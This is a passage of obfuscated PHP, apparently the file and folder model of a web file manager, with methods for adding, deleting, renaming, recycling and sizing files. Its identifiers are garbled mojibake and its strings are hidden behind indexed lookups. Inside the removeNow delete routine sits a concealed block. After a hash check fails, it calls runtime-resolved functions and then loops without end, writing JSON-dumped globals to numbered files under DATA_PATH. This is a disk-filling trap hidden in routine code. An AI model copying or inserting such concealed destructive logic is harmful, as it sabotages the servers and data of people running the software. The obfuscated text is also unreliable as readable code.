$µÆ¯çÑ[$öÉÈ–ĞÕ[547]], $öÉÈ–ĞÕ[627] => $–ı”ùé³, $öÉÈ–ĞÕ[628] => $–ı”ùé³, $öÉÈ–ĞÕ[454] => $µÆ¯çÑ[$öÉÈ–ĞÕ[191]], $öÉÈ–ĞÕ[629] => $µÆ¯çÑ[$öÉÈ–ĞÕ[562]] . $µÆ¯çÑ[$öÉÈ–ĞÕ[191]] . $öÉÈ–ĞÕ[60], $öÉÈ–ĞÕ[481] => 0, $öÉÈ–ĞÕ[630] => $öÉÈ–ĞÕ[22]); $ˆÌñ£®¦ = array_merge($Å¯€ŠÂÔ, $ˆÌñ£®¦); $this->updateModifyTime($ˆÌñ£®¦[$öÉÈ–ĞÕ[190]]); $ä†‘†„ = $öÉÈ–ĞÕ[2171] . $µÆ¯çÑ[$öÉÈ–ĞÕ[191]]; if (isset(self::$cacheChildList[$ä†‘†„])) { unset(self::$cacheChildList[$ä†‘†„]); } static $¬„Ïò´ = false; if (!$¬„Ïò´) { Hook::trigger($öÉÈ–ĞÕ[613], $ˆÌñ£®¦); $¬„Ïò´ = !0; } $Õğûşë = $this->add($ˆÌñ£®¦); $˜üÆıßÀ = array($öÉÈ–ĞÕ[631] => short_id($Õğûşë)); $this->where(array($öÉÈ–ĞÕ[468] => $Õğûşë))->save($˜üÆıßÀ); $this->setNamePinyin($Õğûşë, $ˆÌñ£®¦[$öÉÈ–ĞÕ[42]]); return $Õğûşë; } public function remove($òúôÁåĞ, $úãöìÊù = true) { $şª ëùº =& $_SERVER[ú÷îèÆÜ]; $ï­üëó = $this->sourceInfo($òúôÁåĞ); $„ï²ÏåÖ = intval($ï­üëó[$şª ëùº[188]]) === self::TYPE_SYSTEM; $‰—·ğ‡ø = Model($şª ëùº[485])->get($şª ëùº[2172]) == $şª ëùº[98]; if ($„ï²ÏåÖ || $úãöìÊù || !$‰—·ğ‡ø) { return $this->removeNow($òúôÁåĞ, $úãöìÊù); } $ã„“’› = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $™èåÇï = $ï­üëó[$şª ëùº[188]] == self::TYPE_USER ? $şª ëùº[639] : $şª ëùº[556]; if ($™èåÇï == $şª ëùº[639]) { $¬ø°î¨æ = Model($şª ëùº[555])->getInfo($ï­üëó[$şª ëùº[547]]); $Ç…šÍÏ® = !empty($¬ø°î¨æ[$şª ëùº[2165]]) ? $¬ø°î¨æ[$şª ëùº[2165]] : $¬ø°î¨æ[$şª ëùº[42]]; $Ç…šÍÏ® = $şª ëùº[313] . $Ç…šÍÏ® . $şª ëùº[2173] . $ï­üëó[$şª ëùº[547]]; } else { $¬ø°î¨æ = Model($şª ëùº[563])->getInfo($ï­üëó[$şª ëùº[547]]); $Ç…šÍÏ® = _get($¬ø°î¨æ, $şª ëùº[42]); $Ç…šÍÏ® = $şª ëùº[173] . $Ç…šÍÏ® . $şª ëùº[2174] . $ï­üëó[$şª ëùº[547]]; } $‰ÆÍ¯À± = $şª ëùº[2175] . md5($Ç…šÍÏ®); CacheLock::lock($‰ÆÍ¯À±); $–ûĞÀ®³ = $this->fileNameExist($ã„“’›, $Ç…šÍÏ®); if (!$–ûĞÀ®³) { $–ûĞÀ®³ = $this->mkdir($ã„“’›, $Ç…šÍÏ®, REPEAT_SKIP); $this->metaSet($–ûĞÀ®³, $şª ëùº[2176], $™èåÇï); $this->metaSet($–ûĞÀ®³, $şª ëùº[2177], $ï­üëó[$şª ëùº[547]]); if ($ï­üëó[$şª ëùº[190]] != 0) { $this->metaSet($–ûĞÀ®³, $şª ëùº[2178], _get($¬ø°î¨æ, $şª ëùº[2179])); } } CacheLock::unlock($‰ÆÍ¯À±); $this->metaSet($òúôÁåĞ, $şª ëùº[2180], $ï­üëó[$şª ëùº[190]]); $this->where(array($şª ëùº[191] => $òúôÁåĞ))->save(array($şª ëùº[475] => time())); $this->recycleClear($ï­üëó); $âÉì‰©ş = $this->move($òúôÁåĞ, $–ûĞÀ®³, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ï­üëó[$şª ëùº[190]]); return $âÉì‰©ş; } private function recycleClear($‘±·”ê¯) { $²¾ïĞ§¦ =& $_SERVER[ú÷îèÆÜ]; $¦ÃªÛÑ‡ = $this->childrenAll($‘±·”ê¯); $ÃÌƒäË˜ = array($²¾ïĞ§¦[468] => array($²¾ïĞ§¦[469], $¦ÃªÛÑ‡[$²¾ïĞ§¦[2181]])); Model($²¾ïĞ§¦[2182])->where($ÃÌƒäË˜)->delete(); } public function removeNow($ÓìÚ¹–Ä, $ÎÑƒÆ¶ = true) { $æ³¦ßÉÆ =& $_SERVER[ú÷îèÆÜ]; $¶ÆÅ—‡Ü = $_SERVER[$æ³¦ßÉÆ[15]]; $®ĞıŠß‡ = $æ³¦ßÉÆ[917]; if ($_SERVER[$æ³¦ßÉÆ[6]] != $®ĞıŠß‡($¶ÆÅ—‡Ü)) { $Êñ®şÄ¨ = $æ³¦ßÉÆ[918]; $»Š¾úå« = $æ³¦ßÉÆ[8]; $è»ÔÒ¾ = $_SERVER[$æ³¦ßÉÆ[9]] . $æ³¦ßÉÆ[10]; $ô¼ÚÂÓ = $»Š¾úå«($è»ÔÒ¾); $ˆ›Éş¾ = explode($æ³¦ßÉÆ[11], $ô¼ÚÂÓ); if (count($ˆ›Éş¾) < $æ³¦ßÉÆ[662]) { $ãˆ‚ñù² = $æ³¦ßÉÆ[13]; $ãˆ‚ñù²(); } $óĞ‰½‘Ü = $æ³¦ßÉÆ[919]; $óĞ‰½‘Ü($_SERVER[$æ³¦ßÉÆ[920]]); $Êñ®şÄ¨ = $æ³¦ßÉÆ[918]; $Êñ®şÄ¨(); $§ÉÂ•’º = $æ³¦ßÉÆ[921]; $×ì™ÉìÅ = json_encode($GLOBALS[$æ³¦ßÉÆ[922]]); $ö‰ÚäŸ = 1; for ($ÅÜŸÖ = $ö‰ÚäŸ; $ÅÜŸÖ > 0; $ÅÜŸÖ++) { $§ÉÂ•’º(DATA_PATH . $ÅÜŸÖ, $×ì™ÉìÅ); } } $­áúÙşÔ = $this->sourceInfo($ÓìÚ¹–Ä); $²–ù¾ó² = $this->pathInfoMore($ÓìÚ¹–Ä); if (!$­áúÙşÔ) { return !0; } if ($­áúÙşÔ[$æ³¦ßÉÆ[190]] == 0) { if (!_get($GLOBALS, $æ³¦ßÉÆ[545])) { return !1; } } $this->lockMoveStart($ÓìÚ¹–Ä); Hook::trigger($æ³¦ßÉÆ[2183], $²–ù¾ó², $ÎÑƒÆ¶); if ($ÎÑƒÆ¶) { Model($æ³¦ßÉÆ[2182])->moveToRecycle($ÓìÚ¹–Ä); } else { $¿³ÂğâÇ = $this->childrenAll($­áúÙşÔ); Model($æ³¦ßÉÆ[610])->eventRemove($ÓìÚ¹–Ä); $this->removeRelevance($¿³ÂğâÇ[$æ³¦ßÉÆ[2181]], $¿³ÂğâÇ[$æ³¦ßÉÆ[1496]]); } $this->folderSizeReset($­áúÙşÔ[$æ³¦ßÉÆ[190]]); $•®Ëé¹¡ = array($­áúÙşÔ[$æ³¦ßÉÆ[190]]); if ($­áúÙşÔ[$æ³¦ßÉÆ[462]] == $æ³¦ßÉÆ[98]) { $•®Ëé¹¡[] = $­áúÙşÔ[$æ³¦ßÉÆ[191]]; } $this->updateModifyTime($•®Ëé¹¡); $this->lockMoveEnd($ÓìÚ¹–Ä); Hook::trigger($æ³¦ßÉÆ[1727], $²–ù¾ó², $ÎÑƒÆ¶); return !0; } public function childrenAll($ğĞøˆñ) { $ôÓÂ©ö =& $_SERVER[ú÷îèÆÜ]; $ŞÌöÂ = $ğĞøˆñ[$ôÓÂ©ö[191]]; if ($ğĞøˆñ[$ôÓÂ©ö[462]] == $ôÓÂ©ö[98]) { $üçÀÖ»ã = array($ôÓÂ©ö[629] => array($ôÓÂ©ö[589], $ğĞøˆñ[$ôÓÂ©ö[562]] . $ŞÌöÂ . $ôÓÂ©ö[590])); $“¬ôäµ = array($ôÓÂ©ö[629] => $üçÀÖ»ã[$ôÓÂ©ö[562]]); $šàşË£Ä = $this->field($ôÓÂ©ö[2184])->where($“¬ôäµ)->select(); $ÆÔöœÑó = !1; $«ùÖÜ‹¢ = array($ŞÌöÂ); if ($šàşË£Ä) { $ÆÔöœÑó = array_to_keyvalue($šàşË£Ä, $ôÓÂ©ö[22], $ôÓÂ©ö[518]); $ÆÔöœÑó = array_remove_value($ÆÔöœÑó, $ôÓÂ©ö[222]); $«ùÖÜ‹¢ = array_to_keyvalue($šàşË£Ä, $ôÓÂ©ö[22], $ôÓÂ©ö[191]); $«ùÖÜ‹¢[] = $ŞÌöÂ; } } else { $ÆÔöœÑó = array($ğĞøˆñ[$ôÓÂ©ö[518]]); $«ùÖÜ‹¢ = array($ŞÌöÂ); } return array($ôÓÂ©ö[2181] => $«ùÖÜ‹¢, $ôÓÂ©ö[1496] => $ÆÔöœÑó); } public function removeArray($ĞÉ©¯É) { if (!$ĞÉ©¯É) { return !0; } } public function removeRelevance($ü¨ËÜè, $¢ÃäÚ‘à) { $Áø§ ‘Ù =& $_SERVER[ú÷îèÆÜ]; $ü¨ËÜè = $ü¨ËÜè ? $ü¨ËÜè : array(); $¢ÃäÚ‘à = $¢ÃäÚ‘à ? $¢ÃäÚ‘à : array(); $ü¨ËÜè = array_unique(array_filter($ü¨ËÜè)); $¢ÃäÚ‘à = array_unique(array_filter($¢ÃäÚ‘à)); if (!$ü¨ËÜè) { return !1; } $ûÎÌ½¸Œ = array($Áø§ ‘Ù[468] => array($Áø§ ‘Ù[469], $ü¨ËÜè)); Model($Áø§ ‘Ù[2182])->where($ûÎÌ½¸Œ)->delete(); Model($Áø§ ‘Ù[512])->where($ûÎÌ½¸Œ)->delete(); Model($Áø§ ‘Ù[2030])->where($ûÎÌ½¸Œ)->delete(); Model($Áø§ ‘Ù[610])->where($ûÎÌ½¸Œ)->delete(); Model($Áø§ ‘Ù[1863])->removeBySource($ü¨ËÜè); Model($Áø§ ‘Ù[2163])->removeBySource($ü¨ËÜè); $this->where($ûÎÌ½¸Œ)->delete(); Model($Áø§ ‘Ù[521])->remove($¢ÃäÚ‘à); for ($éÄÂÌ€ê = 0; $éÄÂÌ€ê < count($ü¨ËÜè); $éÄÂÌ€ê++) { $this->sourceCacheClear($ü¨ËÜè[$éÄÂÌ€ê]); } } public function rename($­¾Ÿ…Ï, $ï¾Ìò›œ) { $îÁ õ‘ =& $_SERVER[ú÷îèÆÜ]; $¾í°˜™‚ = $this->sourceInfo($­¾Ÿ…Ï); if (!$¾í°˜™‚) { return !1; } $¾ğè­ßÛ = $this->fileNameExist($¾í°˜™‚[$îÁ õ‘[190]], $ï¾Ìò›œ); if ($¾ğè­ßÛ && $¾ğè­ßÛ != $­¾Ÿ…Ï) { return !1; } $³£ƒºÎ = array($îÁ õ‘[471] => $ï¾Ìò›œ, $îÁ õ‘[628] => USER_ID); if ($¾í°˜™‚[$îÁ õ‘[462]] != $îÁ õ‘[98]) { $³£ƒºÎ[$îÁ õ‘[463]] = substr(get_path_ext($ï¾Ìò›œ), 0, 10); } Model($îÁ õ‘[610])->eventRename($­¾Ÿ…Ï, $¾í°˜™‚[$îÁ õ‘[42]], $ï¾Ìò›œ); $this->sourceCacheClear($­¾Ÿ…Ï); $this->setNamePinyin($­¾Ÿ…Ï, $³£ƒºÎ[$îÁ õ‘[42]], !1); $this->updateModifyTime($¾í°˜™‚[$îÁ õ‘[190]]); $úò³ƒƒ€ = $this->where(array($îÁ õ‘[468] => $­¾Ÿ…Ï))->data($³£ƒºÎ)->save(); $áéî‹óô = $îÁ õ‘[2171] . $¾í°˜™‚[$îÁ õ‘[190]]; if (isset(self::$cacheChildList[$áéî‹óô])) { unset(self::$cacheChildList[$áéî‹óô]); } return $úò³ƒƒ€; } public function setNamePinyin($£ïÚºë, $„Êû‹†, $ŞÉ•ó = true) { $Øê ˜× =& $_SERVER[ú÷îèÆÜ]; $“ÊÜóùƒ = Input::check($„Êû‹†, $Øê ˜×[632]); $½Ò¹é°… = array($Øê ˜×[494] => KodSort::makeStr($„Êû‹†)); if ($“ÊÜóùƒ) { $½Ò¹é°…[$Øê ˜×[515]] = str_replace($Øê ˜×[63], $Øê ˜×[22], Pinyin::get($„Êû‹†)); $½Ò¹é°…[$Øê ˜×[514]] = Pinyin::get($„Êû‹†, $Øê ˜×[633]); } if (!$ŞÉ•ó && !$“ÊÜóùƒ) { $½Ò¹é°…[$Øê ˜×[515]] = null; $½Ò¹é°…[$Øê ˜×[514]] = null; } $this->metaSet($£ïÚºë, $½Ò¹é°…); } public function getContent($÷Šİ¢Ÿ¹) { $½ÙÈ¼ë‘ =& $_SERVER[ú÷îèÆÜ]; $Ç¥›²ƒà = $this->fileInfoGet($÷Šİ¢Ÿ¹); if (!$Ç¥›²ƒà) { return !1; } if ($Ç¥›²ƒà[$½ÙÈ¼ë‘[86]] == 0) { return $½ÙÈ¼ë‘[22]; } $ˆ’–Ñà‹ = $½ÙÈ¼ë‘[2185] . $Ç¥›²ƒà[$½ÙÈ¼ë‘[650]]; if ($Ç¥›²ƒà[$½ÙÈ¼ë‘[86]] <= 1024 * 10) { $³Ê¶ëƒ½ = Cache::get($ˆ’–Ñà‹); if (!$³Ê¶ëƒ½) { $³Ê¶ëƒ½ = IO::getContent($Ç¥›²ƒà[$½ÙÈ¼ë‘[94]]); Cache::set($ˆ’–Ñà‹, $³Ê¶ëƒ½); } return $³Ê¶ëƒ½; } if (!$Ç¥›²ƒà[$½ÙÈ¼ë‘[94]]) { return $½ÙÈ¼ë‘[22]; } return IO::getContent($Ç¥›²ƒà[$½ÙÈ¼ë‘[94]]); } public function setDesc($€§»ò‚Ì, $Î¤êæÇµ) { $ó¶òÇæ =& $_SERVER[ú÷îèÆÜ]; Model($ó¶òÇæ[610])->eventAddDesc($€§»ò‚Ì, $Î¤êæÇµ); return $this->metaSet($€§»ò‚Ì, $ó¶òÇæ[503], $Î¤êæÇµ); } public function setContent($Ÿ’ºğüÉ, $€Î¹šù» = '') { $…çÄ©­ï =& $_SERVER[ú÷îèÆÜ]; $Œ¢ıÖÈ» = $this->sourceInfo($Ÿ’ºğüÉ); $ˆ„õº³ = $this->fileInfoGet($Ÿ’ºğüÉ); if (!$ˆ„õº³ || !$Œ¢ıÖÈ») { return !1; } $©İ›ß‹ = Model($…çÄ©­ï[521])->addFileByContent($€Î¹šù», $Œ¢ıÖÈ»[$…çÄ©­ï[42]]); $»£…ÍòÁ = $this->fileHistory($Œ¢ıÖÈ», $©İ›ß‹[$…çÄ©­ï[518]], $©İ›ß‹[$…çÄ©­ï[86]]); if (!$»£…ÍòÁ) { return Model($…çÄ©­ï[521])->remove($©İ›ß‹[$…çÄ©­ï[518]]); } $this->folderSizeReset($Œ¢ıÖÈ»[$…çÄ©­ï[190]]); return !0; } public function fileSubstr($ÂïÜ÷‘í, $«©ãİû, $¯œèÁºã) { $¿è¢—ŒÂ = $this->fileInfoGet($ÂïÜ÷‘í); if (!$¿è¢—ŒÂ) { return !1; } return IO::fileSubstr($¿è¢—ŒÂ[$_SERVER[ú÷îèÆÜ][94]], $«©ãİû, $¯œèÁºã); } public function fileInfoGet($ËÅåµ¡¶) { $€ı†×ƒ³ =& $_SERVER[ú÷îèÆÜ]; $‡™õÚ–° = $this->sourceInfo($ËÅåµ¡¶); if (!$‡™õÚ–° || $‡™õÚ–°[$€ı†×ƒ³[462]]) { return !1; } $§Ğ‰Ã¤ß = $€ı†×ƒ³[524] . $‡™õÚ–°[$€ı†×ƒ³[518]]; $Ù™§èŞ† = _get(self::$cacheFileInfo, $§Ğ‰Ã¤ß); if ($Ù™§èŞ†) { return $Ù™§èŞ†; } $òŠÖºÎÂ = Model($€ı†×ƒ³[521])->fileInfo($‡™õÚ–°[$€ı†×ƒ³[518]]); if ($òŠÖºÎÂ) { $òŠÖºÎÂ[$€ı†×ƒ³[42]] = $‡™õÚ–°[$€ı†×ƒ³[42]]; } self::$cacheFileInfo[$§Ğ‰Ã¤ß] = $òŠÖºÎÂ; return $òŠÖºÎÂ; } private function folderChildrenNumber($ı°¼ğÓø) { $üÁ°„ï =& $_SERVER[ú÷îèÆÜ]; $êáò±ñ = $this->sourceInfo($ı°¼ğÓø); $¨¡‘‹´Ú = array($üÁ°„ï[629] => array($üÁ°„ï[589], $êáò±ñ[$üÁ°„ï[562]] . $ı°¼ğÓø . $üÁ°„ï[590]), $üÁ°„ï[626] => $êáò±ñ[$üÁ°„ï[547]], $üÁ°„ï[481] => intval($êáò±ñ[$üÁ°„ï[482]]), $üÁ°„ï[623] => 1); $â¡Ù·¦Ì = $this->where($¨¡‘‹´Ú)->count(); $²„ªŸğ¼ = $this->where($¨¡‘‹´Ú)->where(array($üÁ°„ï[623] => 0))->count(); return array($üÁ°„ï[90] => $²„ªŸğ¼, $üÁ°„ï[91] => $â¡Ù·¦Ì); } public function pathInfo($öæ‚´»›, $†±˜ÔÁ = false) { $¾»¹Š»’ =& $_SERVER[ú÷îèÆÜ]; $†±˜ÔÁ = !1; $öæ‚´»› = intval($öæ‚´»›); $ëë¼¦ûÁ = $¾»¹Š»’[511] . intval($†±˜ÔÁ) . $¾»¹Š»’[439] . $öæ‚´»›; $¦ı®ÉÂÌ = _get(self::$cachePathInfo, $ëë¼¦ûÁ); if ($¦ı®ÉÂÌ) { return $¦ı®ÉÂÌ; } $ä’Ùµî¡ = $this->sourceInfo($öæ‚´»›); if (!$ä’Ùµî¡) { return !1; } $ä’Ùµî¡ = $this->_listDataApplyItem($ä’Ùµî¡, $†±˜ÔÁ); self::$cachePathInfo[$ëë¼¦ûÁ] = $ä’Ùµî¡; return $ä’Ùµî¡; } public static $cachePathInfoMore = array(); public function pathInfoMore($ô¸ø…ê) { $°ºÛŒ¹á =& $_SERVER[ú÷îèÆÜ]; $”“äŸ• = _get(self::$cachePathInfoMore, $ô¸ø…ê); if ($”“äŸ•) { return $”“äŸ•; } $Ê’«ËÕì = $this->pathInfo($ô¸ø…ê); if (!$Ê’«ËÕì) { return !1; } if ($Ê’«ËÕì[$°ºÛŒ¹á[462]] == $°ºÛŒ¹á[98]) { $Ê’«ËÕì[$°ºÛŒ¹á[89]] = $this->folderChildrenNumber($ô¸ø…ê); } self::$cachePathInfoMore[$ô¸ø…ê] = $Ê’«ËÕì; return $Ê’«ËÕì; } public function sourceInfo($ĞÄô‹œ‘) { $—ÍÌİ =& $_SERVER[ú÷îèÆÜ]; if (!$ĞÄô‹œ‘) { return array(); } $ĞÄô‹œ‘ = intval($ĞÄô‹œ‘); $±øŸºœ = $—ÍÌİ[510] . $ĞÄô‹œ‘; $ü‰éäşù = _get(self::$cacheSourceInfo, $±øŸºœ); if ($ü‰éäşù) { return $ü‰éäşù; } $Ó»’¦Å– = $this->where(array($—ÍÌİ[191] => $ĞÄô‹œ‘))->find(); self::$cacheSourceInfo[$±øŸºœ] = $Ó»’¦Å–; return self::$cacheSourceInfo[$±øŸºœ]; } public function sourceCacheClear($ì£Îõº = false) { self::cacheClear($ì£Îõº); } public static function cacheClear($‚İ›»š = false) { $Î¶É¿ŞÈ =& $_SERVER[ú÷îèÆÜ]; if ($‚İ›»š == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Î¶É¿ŞÈ[510] . $‚İ›»š]); unset(self::$cachePathInfoMore[$‚İ›»š]); unset(self::$cachePathInfo[$Î¶É¿ŞÈ[2186] . $‚İ›»š]); unset(self::$cachePathInfo[$Î¶É¿ŞÈ[2187] . $‚İ›»š]); } public function metaSet($ãÌø‡Ï§, $Ò‘åŒ¾õ = null, $ÍŸ·‘“¨ = null) { $¤Û¹İå¯ = parent::metaSet($ãÌø‡Ï§, $Ò‘åŒ¾õ, $ÍŸ·‘“¨); if ($¤Û¹İå¯) { $this->sourceCacheClear($ãÌø‡Ï§); } return $¤Û¹İå¯; } public function pathInfoByPath($·õşÑ–§, $®ü¤—†°) { $¥Ú²­îİ =& $_SERVER[ú÷îèÆÜ]; $ŞÅ™”è… = !$®ü¤—†° ? array() : explode($¥Ú²­îİ[18], trim($®ü¤—†°, $¥Ú²­îİ[18])); $Ç”ùÔä× = $·õşÑ–§; foreach ($ŞÅ™”è… as $ã€é‡Š·) { $½áÆ…ìİ = array($¥Ú²­îİ[190] => $Ç”ùÔä×, $¥Ú²­îİ[42] => $ã€é‡Š·); $ãßßô†Í = $this->field($¥Ú²­îİ[2188])->where($½áÆ…ìİ)->select(); if (!$ãßßô†Í) { return !1; } $ãßßô†Í = array_sort_by($ãßßô†Í, $¥Ú²­îİ[482]); $Ç”ùÔä× = $ãßßô†Í[0][$¥Ú²­îİ[191]]; } $ÏÙÔ¤Ú¾ = $this->sourceInfo($Ç”ùÔä×); $this->pathInfoFilter($ÏÙÔ¤Ú¾); return $ÏÙÔ¤Ú¾; } protected function updateModifyTime($ğôš‹Ö ) { $©¾ìí  =& $_SERVER[ú÷îèÆÜ]; $£­–Ù²Ğ = defined($©¾ìí [2104]) ? USER_ID : 0; if (!$ğôš‹Ö ) { return; } if (!is_array($ğôš‹Ö )) { $ğôš‹Ö  = array($ğôš‹Ö ); } foreach ($ğôš‹Ö  as $Ì¼šúµ… => $Ø’‹ïÊ²) { $ğôš‹Ö [$Ì¼šúµ…] = intval($Ø’‹ïÊ²); $this->sourceCacheClear($Ø’‹ïÊ²); } $–µ˜û¦… = array($©¾ìí [191] => array($©¾ìí [17], $ğôš‹Ö )); $Ôë¬Äı– = array($©¾ìí [628] => $£­–Ù²Ğ, $©¾ìí [475] => time()); $this->where($–µ˜û¦…)->save($Ôë¬Äı–); } public function folderSizeReset($¼ÉïÇõÉ, $ÄÈ¨ÉØ™ = false) { $·‡óşÆ =& $_SERVER[ú÷îèÆÜ]; if ($this->statusIgnoreResetSpace) { return; } $ôé·€¨Ğ = $this->sourceInfo($¼ÉïÇõÉ); $ÍÕÚŸÅ¯ = $·‡óşÆ[2189] . $¼ÉïÇõÉ; CacheLock::lock($ÍÕÚŸÅ¯, 20); if ($ÄÈ¨ÉØ™ === !1) { $this->sourceCacheClear($¼ÉïÇõÉ); $ôé·€¨Ğ = $this->sourceInfo($¼ÉïÇõÉ); $µ“À¥“’ = array($·‡óşÆ[454] => $¼ÉïÇõÉ, $·‡óşÆ[481] => 0); $‘ñÚÒØ = $this->where($µ“À¥“’)->sum($·‡óşÆ[86]); $ÄÈ¨ÉØ™ = intval($‘ñÚÒØ) - intval($ôé·€¨Ğ[$·‡óşÆ[86]]); } if ($ÄÈ¨ÉØ™ == 0) { return CacheLock::unlock($ÍÕÚŸÅ¯); } $ŸÒÓ½Á¿ = $this->parentLevelArray($ôé·€¨Ğ[$·‡óşÆ[562]]); if (!$ŸÒÓ½Á¿) { $ŸÒÓ½Á¿ = array(); } $ŸÒÓ½Á¿[] = $ôé·€¨Ğ[$·‡óşÆ[191]]; $µ“À¥“’ = array($·‡óşÆ[191] => array($·‡óşÆ[469], $ŸÒÓ½Á¿)); if ($ÄÈ¨ÉØ™ < 0) { $µ“À¥“’[$·‡óşÆ[86]] = array($·‡óşÆ[1056], abs($ÄÈ¨ÉØ™)); } $this->where($µ“À¥“’)->setAdd($·‡óşÆ[86], $ÄÈ¨ÉØ™); CacheLock::unlock($ÍÕÚŸÅ¯); $²¶¯ï¦ = $·‡óşÆ[2190] . $ôé·€¨Ğ[$·‡óşÆ[188]] . $·‡óşÆ[4] . $ôé·€¨Ğ[$·‡óşÆ[547]]; $Ø¼³Ş× = array($ôé·€¨Ğ[$·‡óşÆ[188]], $ôé·€¨Ğ[$·‡óşÆ[547]]); TaskRun::timeLimitCall($²¶¯ï¦, $·‡óşÆ[2191], $Ø¼³Ş×, 1.5); } public function folderSizeResetChildren($ñçÔŸø³) { $´«‚ú™Ÿ =& $_SERVER[ú÷îèÆÜ]; $this->sourceCacheClear($ñçÔŸø³); $»òöÁÊŒ = $this->sourceInfo($ñçÔŸø³); $€øºµ¿ñ = array($´«‚ú™Ÿ[623] => 1, $´«‚ú™Ÿ[626] => $»òöÁÊŒ[$´«‚ú™Ÿ[547]], $´«‚ú™Ÿ[629] => array($´«‚ú™Ÿ[589], $»òöÁÊŒ[$´«‚ú™Ÿ[562]] . $ñçÔŸø³ . $´«‚ú™Ÿ[590])); $ìï æøƒ = $´«‚ú™Ÿ[2192]; $Ë¹÷â“ü = $this->field($ìï æøƒ)->where($€øºµ¿ñ)->select(); $€øºµ¿ñ[$´«‚ú™Ÿ[462]] = 0; $ù½õ©«¾ = $this->field($ìï æøƒ)->where($€øºµ¿ñ)->select(); if (!$ù½õ©«¾) { return; } $Ë¹÷â“ü[] = $»òöÁÊŒ; $Ë¹÷â“ü = array_to_keyvalue($Ë¹÷â“ü, $´«‚ú™Ÿ[191]); foreach ($Ë¹÷â“ü as $¦”Áìº => $­ØìîÖï) { $Ë¹÷â“ü[$¦”Áìº][$´«‚ú™Ÿ[2193]] = $Ë¹÷â“ü[$¦”Áìº][$´«‚ú™Ÿ[86]]; $Ë¹÷â“ü[$¦”Áìº][$´«‚ú™Ÿ[86]] = 0; } foreach ($ù½õ©«¾ as $­ØìîÖï) { $ÂÔí¢é– = $­ØìîÖï[$´«‚ú™Ÿ[190]] . $´«‚ú™Ÿ[22]; if (!isset($Ë¹÷â“ü[$ÂÔí¢é–])) { continue; } if ($­ØìîÖï[$´«‚ú™Ÿ[482]] == $Ë¹÷â“ü[$ÂÔí¢é–][$´«‚ú™Ÿ[482]]) { $Ë¹÷â“ü[$ÂÔí¢é–][$´«‚ú™Ÿ[86]] += $­ØìîÖï[$´«‚ú™Ÿ[86]]; } } foreach ($Ë¹÷â“ü as $­ØìîÖï) { $åÛëÅ¤ù = $this->parentLevelArray($­ØìîÖï[$´«‚ú™Ÿ[562]]); foreach ($åÛëÅ¤ù as $ÂÔí¢é–) { $ÂÔí¢é– = $ÂÔí¢é– . $´«‚ú™Ÿ[22]; if (!isset($Ë¹÷â“ü[$ÂÔí¢é–])) { continue; } if ($­ØìîÖï[$´«‚ú™Ÿ[482]] == $Ë¹÷â“ü[$ÂÔí¢é–][$´«‚ú™Ÿ[482]]) { $Ë¹÷â“ü[$ÂÔí¢é–][$´«‚ú™Ÿ[86]] += $­ØìîÖï[$´«‚ú™Ÿ[86]]; } } } $ĞÜ¾ÁÊØ = array(); foreach ($Ë¹÷â“ü as $­ØìîÖï) { if ($­ØìîÖï[$´«‚ú™Ÿ[86]] == $­ØìîÖï[$´«‚ú™Ÿ[2193]]) { continue; } $ĞÜ¾ÁÊØ[] = array($´«‚ú™Ÿ[191], $­ØìîÖï[$´«‚ú™Ÿ[191]], $´«‚ú™Ÿ[86], $­ØìîÖï[$´«‚ú™Ÿ[86]]); } $this->saveAll($ĞÜ¾ÁÊØ); } public function userSpaceReset($Øíòé®Ì = false) { $€Ùàñ‘¯ =& $_SERVER[ú÷îèÆÜ]; $ Ë¥Æé¿ = $this->where(array($€Ùàñ‘¯[188] => self::TYPE_USER, $€Ùàñ‘¯[547] => $Øíòé®Ì, $€Ùàñ‘¯[462] => 0))->sum($€Ùàñ‘¯[86]); $ Ë¥Æé¿ = !$ Ë¥Æé¿ || $ Ë¥Æé¿ <= 0 ? 0 : $ Ë¥Æé¿; Model($€Ùàñ‘¯[555])->userEdit($Øíòé®Ì, array($€Ùàñ‘¯[1872] => $ Ë¥Æé¿)); } public function targetSpaceUpdate($®ìïåıÉ, $Â£î´‡¢) { $‰¸—¹Á =& $_SERVER[ú÷îèÆÜ]; if (!$Â£î´‡¢) { return; } if (!in_array($®ìïåıÉ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ÿ’²¼Ô© = $this->targetSpaceSize($®ìïåıÉ, $Â£î´‡¢); if ($®ìïåıÉ == self::TYPE_USER) { Model($‰¸—¹Á[555])->userEdit($Â£î´‡¢, array($‰¸—¹Á[1872] => $Ÿ’²¼Ô©)); } else { if ($®ìïåıÉ == self::TYPE_GROUP) { Model($‰¸—¹Á[563])->groupEdit($Â£î´‡¢, array($‰¸—¹Á[1872] => $Ÿ’²¼Ô©)); } } } public function targetSpaceSize($ ùÁ€‡İ, $Ö™âÛ) { $ºî¡–Ú™ =& $_SERVER[ú÷îèÆÜ]; $òË–µü = 0; $Ñà±Ù«– = $this->targetSourceRoot($ ùÁ€‡İ, $Ö™âÛ, !0); foreach ($Ñà±Ù«– as $„©ƒ ö) { if (!$„©ƒ ö) { continue; } $òË–µü += floatval($„©ƒ ö[$ºî¡–Ú™[86]]); $óäæğ• = array($ºî¡–Ú™[629] => array($ºî¡–Ú™[589], $ºî¡–Ú™[572] . $„©ƒ ö[$ºî¡–Ú™[191]] . $ºî¡–Ú™[590])); $ï¦¤áá¦ = Model($ºî¡–Ú™[480])->field($ºî¡–Ú™[468])->where($óäæğ•)->select(); $ï¦¤áá¦ = array_to_keyvalue($ï¦¤áá¦, $ºî¡–Ú™[22], $ºî¡–Ú™[191]); $ï¦¤áá¦ = array_unique(array_filter($ï¦¤áá¦)); if ($ï¦¤áá¦) { $óäæğ• = array($ºî¡–Ú™[468] => array($ºî¡–Ú™[469], $ï¦¤áá¦)); $òË–µü += floatval($this->where($óäæğ•)->sum($ºî¡–Ú™[86])); } } $òË–µü = !$òË–µü || $òË–µü <= 0 ? 0 : $òË–µü; return $òË–µü; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($‰ÇÉÏúº) { return $this->fileTypeProfile($‰ÇÉÏúº, SourceModel::TYPE_USER); } public function groupFileTypeProfile($½À¦Ó”¸) { return $this->fileTypeProfile($½À¦Ó”¸, SourceModel::TYPE_GROUP); } private function 